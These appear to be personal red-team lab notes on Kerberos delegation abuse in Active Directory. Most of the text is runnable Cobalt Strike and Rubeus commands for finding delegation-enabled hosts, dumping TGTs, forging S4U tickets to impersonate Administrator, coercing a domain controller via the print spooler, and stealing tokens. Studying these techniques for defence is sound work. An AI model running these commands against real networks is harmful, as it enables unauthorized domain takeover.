
Kerberos replaced NTLM as the default domain authentication since windows 2000 server

Principals = (users and computers)
KDC (Key distribution Center)
- Database of all principals and their associated secrets (password hashes)
- AS = Authentication Server
- TGS = Ticket Granting Server

In Windows the DC is the KDC and the password hashes are stored in AD.

TGT = Ticket Granting Ticket is a principal afterit has been verified by the AS. Think SSO.
Service = a resource that the principal can access (smb, mysql, etc)

PAC= Privileged Attribute Certificate

Delegation in windows: way for a service that uses another backend service to authenticate the principal for access.

Unconstrained Delegation.
- first but most dangerous
- Enabled by setting the TRUSTED_FOR_DELEGATION on the UserAccountControl Attribute of the computer object

Rubeus:
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap <-- Monitor


In beacon use command: 
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountnameto find computersconfigured for unconstraind delegation.
make_token CONTOSO\rsteel Passw0rd! <-- use token to make a jump
jump psexec64 lon-ws-1 smb <-- jump to a host that has unconstrained
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap <-- Monitor await ticket
jobs
jobkill # <-- kill monitor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET] <-- change user, adomain
steal_token PID
run klist <-- validate
access resources

Constrained Delegation
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo <-- msDS-AllowedToDelegateTo attribute is not null.
ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl <-- Get UAC value for identified samaccountname to see if TRUSTED_TO_AUTH_FOR_DELEGATION flag is set.
- terminal: [Convert]::ToBoolean(16781312 -band 16777216) will covert the value we get to see if true
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 host smb
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap <- dump 1on-ws tgt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /ptt <-- TGT from above to get userable service ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]
steal_token PID
ls \\
actions
-----------------------------------
Service Name Substitution 

Service Name Substitution is a technique that allows an adversary to "swap" a service ticket for one service, to another service.
ie. time to cifs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
Where:
/user is the principal (e.g. computer) configured for the delegation.
/msdsspn is the service that the principal is allowed to delegate to.
/altservice is the service to substitute into the final ticket.
/ticket is the TGT for the principal.
/impersonateuser is the user we want to impersonate.
The altservice parameter actually takes a comma-separated list of services, e.g. /altservice:cifs,host,http.  This will produce 3 new tickets that you can inject.
Role-Based Constrained Delegation.

Steps
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]RjLTE=
steal_token #pid

--------------------------------------

S4U2self

Find unconstrained delegation
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb <-- High integrity

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap <-- monitor for dc user
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1 < -- Force logins with spooler (look at petite potam as well)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT] /nowrap <-- impersonate with self
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: <-- inject
Steal_token Pid
run klist validate
actions





